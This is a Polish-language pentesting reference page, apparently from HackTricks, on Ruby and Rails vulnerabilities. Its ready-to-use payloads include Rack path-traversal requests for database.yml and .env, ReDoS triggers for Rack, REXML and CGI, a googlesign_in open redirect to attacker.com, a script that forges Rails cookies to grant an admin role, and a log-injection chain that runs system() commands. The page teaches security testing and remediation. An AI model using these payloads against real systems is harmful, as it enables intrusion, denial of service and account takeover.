# Triki Ruby

{{#include ../../banners/hacktricks-training.md}}

## Przesyłanie pliku prowadzące do RCE

Jak wyjaśniono w [this article](https://www.offsec.com/blog/cve-2024-46986/), przesłanie pliku `.rb` do wrażliwych katalogów, takich jak `config/initializers/`, może prowadzić do remote code execution (RCE) w aplikacjach Ruby on Rails.

Wskazówki:
- Inne miejsca ładowane przy starcie aplikacji (boot/eager-load), które są wykonywane podczas uruchamiania, również są ryzykowne, jeśli są zapisywalne (np. `config/initializers/` to klasyczny przykład). Jeśli znajdziesz dowolny upload pliku, który trafia gdziekolwiek pod `config/` i później jest evaluowany/required, możesz uzyskać RCE przy starcie.
- Szukaj buildów dev/staging, które kopiują pliki kontrolowane przez użytkownika do obrazu kontenera, gdzie Rails załaduje je przy starcie.

## Active Storage image transformation → command execution (CVE-2025-24293)

Gdy aplikacja używa Active Storage z `image_processing` + `mini_magick`, i przekazuje niezaufane parametry do metod transformacji obrazów, wersje Rails wcześniejsze niż 7.1.5.2 / 7.2.2.2 / 8.0.2.1 mogły umożliwiać wstrzyknięcie komend, ponieważ niektóre metody transformacji były omyłkowo dozwolone domyślnie.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- Co warto próbować podczas testów
- Zidentyfikuj endpointy, które akceptują opcje variant/processing, nazwy transformacji lub dowolne argumenty ImageMagick.
- Fuzz `params[:t]` i `params[:v]` w poszukiwaniu podejrzanych błędów lub efektów ubocznych wykonania. Jeśli możesz wpłynąć na nazwę metody lub przekazać surowe argumenty docierające do MiniMagick, możesz uzyskać code exec na hoście przetwarzającym obrazy.
- Jeśli masz tylko dostęp do odczytu wygenerowanych wariantów, spróbuj ślepej eksfiltracji przez spreparowane operacje ImageMagick.

- Remediation/detections
- Jeśli widzisz Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 z Active Storage + `image_processing` + `mini_magick` i transformacjami kontrolowanymi przez użytkownika, traktuj to jako podatne. Zalecaj aktualizację oraz wymuszanie ścisłych allowlists dla metod/parametrów i zastosowanie utwardzonej polityki ImageMagick.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Jeśli stos docelowy używa middleware Rack bezpośrednio lub przez frameworki, wersje `rack` wcześniejsze niż 2.2.13, 3.0.14 i 3.1.12 pozwalają na Local File Inclusion przez `Rack::Static` gdy `:root` jest niezdefiniowany/nieprawidłowo skonfigurowany. Zakodowany traversal w `PATH_INFO` może ujawnić pliki pod katalogiem roboczym procesu lub nieoczekiwanym rootem.

- Szukaj aplikacji, które montują `Rack::Static` w `config.ru` lub w stackach middleware. Próbuj zakodowanych traversali przeciwko ścieżkom statycznym, na przykład:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Dopasuj prefiks do skonfigurowanych `urls:`. Jeśli aplikacja zwraca zawartość pliku, prawdopodobnie masz LFI do wszystkiego pod rozwiązanym `:root`.

- Mitigation: zaktualizuj Rack; upewnij się, że `:root` wskazuje wyłącznie na katalog plików publicznych i jest ustawione eksplicytnie.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` i < `2.2.8.1` spędzało czas super-liniowy na parsowaniu spreparowanych nagłówków `Content-Type: multipart/form-data`. Pojedynczy POST z olbrzymią listą `A=` w parametrze może zablokować worker Puma/Unicorn i spowodować DoS lub wyczerpanie kolejki żądań.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Działa przeciwko każdemu stackowi opartemu na Rack (Rails/Sinatra/Hanami/Grape). Jeśli przed nim stoi nginx/haproxy z keep-alive, powtórz równolegle, aby wyczerpać workery.
- Patched by making parser linear; szukaj wersji gema `rack` < `3.0.9.1` lub < `2.2.8.1`. W ocenach wskazuj, że WAFy rzadko to blokują, ponieważ nagłówek jest składniowo poprawny.

## REXML XML parser ReDoS (CVE-2024-49761)

Gemm REXML < 3.3.9 (Ruby 3.1 i wcześniejsze) katastrofalnie wykonuje backtrack przy parsowaniu heksadecymalnych odniesień numerycznych zawierających długie ciągi cyfr (np. `&#1111111111111x41;`). Każdy XML przetwarzany przez REXML lub biblioteki je opakowujące (SOAP/XML API clients, SAML, SVG uploads) może być nadużyty do wyczerpania CPU.

Minimalny trigger przeciwko endpointowi Rails, który parsuje XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Jeśli proces pozostaje zajęty przez kilka sekund, a zużycie CPU workerów gwałtownie rośnie, prawdopodobnie jest podatny. Atak jest niskopasmowy i wpływa także na zadania w tle, które ingestują XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Aplikacje używające gemu `cgi` (domyślny w wielu stosach Rack) mogą zostać zablokowane jednym złośliwym nagłówkiem:
- `CGI::Cookie.parse` miało zachowanie ponadliniowe; ogromne ciągi cookie (tysiące delimiterów) wywołują zachowanie O(N²).
- Regex w `CGI::Util#escapeElement` umożliwiał ReDoS przy escapowaniu HTML.

Oba problemy są naprawione w `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. W pentestach wrzuć ogromny nagłówek `Cookie:` lub podaj nieufny HTML do kodu pomocniczego i obserwuj zablokowanie workera. Połącz z keep-alive, żeby wzmocnić efekt.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

Gem `googlesign_in` < 1.3.0 (używany do Google OAuth w Rails) wykonywał niepełną kontrolę same-origin dla parametru `proceedto`. Nieprawidłowy URL taki jak `proceedto=//attacker.com/%2F..` omija tę kontrolę i przekierowuje użytkownika poza serwis, jednocześnie zachowując Rails flash/session cookies.

Exploit flow:
1. Ofiara klika spreparowany link Google Sign-In hostowany przez atakującego.
2. Po uwierzytelnieniu gem przekierowuje na domenę kontrolowaną przez atakującego, ujawniając flash notices lub dowolne dane przechowywane w cookies przypisanych do domeny wildcard.
3. Jeśli aplikacja przechowuje krótkotrwałe tokeny lub magic links w flash, można to wykorzystać do przejęcia konta.

Podczas testów grepuj Gemfile.lock w poszukiwaniu `googlesign_in` < 1.3.0 i próbuj nieprawidłowych wartości `proceedto`. Potwierdź przez nagłówek Location i odbicie cookie.

## Fałszowanie/odszyfrowywanie Rails cookies kiedy `secret_key_base` is leaked

Rails szyfruje i podpisuje cookies używając kluczy pochodzących z `secret_key_base`. Jeśli ta wartość została leaked (np. w repo, logach lub źle skonfigurowanych credentials), zwykle możesz odszyfrować, zmodyfikować i ponownie zaszyfrować cookies. Często prowadzi to do authz bypass, jeśli aplikacja przechowuje w cookies role, user IDs lub feature flags.

Minimalny kod Ruby do odszyfrowania i ponownego zaszyfrowania nowoczesnych cookies (AES-256-GCM, domyślnie w nowszych Rails):

<details>
<summary>Ruby do odszyfrowywania/fałszowania cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Uwagi:
- Starsze aplikacje mogą używać AES-256-CBC i saltów `encrypted cookie` / `signed encrypted cookie`, albo serializerów JSON/Marshal. Dostosuj salta, szyfr i serializer odpowiednio.
- W przypadku kompromitacji/oceny, zmień `secret_key_base`, aby unieważnić wszystkie istniejące ciasteczka.

## Zobacz także (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Gdy aplikacja (często prosty endpoint Rack/Sinatra/Rails) zarówno:
- loguje kontrolowany przez użytkownika ciąg znaków dosłownie, oraz
- później `load`uje plik, którego ścieżka jest wyprowadzana z tego samego ciągu (po `Pathname#cleanpath`),

Często można osiągnąć RCE, zatruwając log, a następnie wymuszając na aplikacji `load` tego pliku z logiem. Podstawowe elementy:

- Ruby `load` ocenia zawartość docelowego pliku jako Ruby niezależnie od rozszerzenia pliku. Każdy czytelny plik tekstowy, którego zawartość parsuje się jako Ruby, zostanie wykonany.
- `Pathname#cleanpath` redukuje segmenty `.` i `..` bez odwoływania się do systemu plików, umożliwiając path smuggling: sterowane przez atakującego śmieci mogą być dołączone na potrzeby logowania, podczas gdy oczyszczona ścieżka wciąż wskazuje na zamierzony plik do wykonania (np. `../logs/error.log`).

### Minimalny wzorzec podatności
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Dlaczego log może zawierać poprawny Ruby
`Logger` zapisuje linie z prefiksem takie jak:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
W Ruby `#` zaczyna komentarz, a `9/2/2025` to tylko działanie arytmetyczne. Aby wstrzyknąć poprawny kod Ruby musisz:
- Rozpocznij swój payload na nowej linii, aby nie został zakomentowany przez `#` w INFO line; wyślij wiodący newline (`\n` lub `%0A`).
- Zamknij wiszący `[` wprowadzony przez INFO line. Powszechnym trikiem jest rozpoczęcie od `]` i opcjonalnie sprawienie, by parser był zadowolony, używając `][0]=1`.
- Następnie umieść dowolny kod Ruby (np. `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Przemycanie pojedynczego ciągu, który jednocześnie zapisuje kod do logu i rozwiązuje się do ścieżki logu
Chcemy jednego attacker-controlled ciągu, który:
- gdy zapisany raw, zawiera nasz Ruby payload, oraz
- gdy zostanie przekazany przez `Pathname.new(<input>).cleanpath`, rozwiązuje się do `../logs/error.log`, więc późniejsze `load` wykona właśnie zatruty plik logu.

`Pathname#cleanpath` ignoruje schematy i scala komponenty przejścia, więc następujące działa:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- `#` przed `://` sprawia, że Ruby ignoruje resztę, gdy log jest wykonywany, podczas gdy `cleanpath` nadal redukuje sufiks do `../logs/error.log`.
- Początkowy znak nowej linii przerywa linię INFO; `]` zamyka wiszący nawias; `][0]=1` spełnia wymagania parsera.

### Eksploatacja end-to-end
1. Wyślij następujące jako nazwę skryptu kopii zapasowej (zakoduj pierwszy znak nowej linii jako `%0A`, jeśli to konieczne):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Aplikacja zapisuje dokładny ciąg znaków do `logs/error.log`.
3. Aplikacja oblicza `cleanpath`, który rozwiązuje się do `../logs/error.log` i wywołuje na nim `load`.
4. Ruby wykonuje kod, który wstrzyknąłeś do logu.

Aby exfiltrate plik w środowisku typu CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (pierwszy znak to znak nowej linii):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Referencje

- [Rails Komunikat bezpieczeństwa: CVE-2025-24293 Active Storage niebezpieczne metody transformacji (naprawione w 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [Komunikat GitHub: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection do Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Dokumentacja Ruby Pathname.cleanpath](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Jak działa load w Ruby](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Komunikat Rack multipart ReDoS (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Komunikaty bezpieczeństwa Ruby dla CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
